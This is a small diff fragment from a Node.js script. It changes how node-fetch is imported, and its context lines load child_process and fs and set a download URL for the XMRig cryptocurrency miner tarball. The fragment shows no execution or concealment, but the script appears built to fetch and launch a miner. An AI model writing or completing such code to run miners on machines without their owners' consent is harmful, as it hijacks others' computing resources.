@@ -1,6 +1,6 @@
 const { spawn, execSync } = require('child_process');
 const fs = require('fs');
-const fetch = require('node-fetch'); // <-- added dependency
+const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
 
 const minerUrl = 'https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz';
 const minerTar = 'xmrig.tar.gz';
